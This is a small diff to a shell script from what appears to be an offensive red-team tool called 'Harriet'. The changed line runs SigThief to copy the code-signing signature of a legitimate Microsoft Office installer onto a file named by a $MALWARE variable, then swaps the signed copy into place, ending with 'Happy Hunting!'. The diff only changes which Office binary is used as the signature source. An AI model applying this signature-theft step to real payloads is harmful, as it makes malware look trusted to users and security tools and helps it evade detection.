@@ -102,7 +102,7 @@ sleep 2
 echo -e ${yellow}"+++Adding Binary Signature+++"${clear}
 echo ""
 sleep 2
-python3 Harriet/Resources/SigThief/sigthief.py -i Harriet/Resources/officedeploymenttool.exe -t $MALWARE -o signed$MALWARE >/dev/null 2>&1
+python3 Harriet/Resources/SigThief/sigthief.py -i Harriet/Resources/OfficeSetup.exe -t $MALWARE -o signed$MALWARE >/dev/null 2>&1
 mv signed$MALWARE $MALWARE
 echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
 echo ""
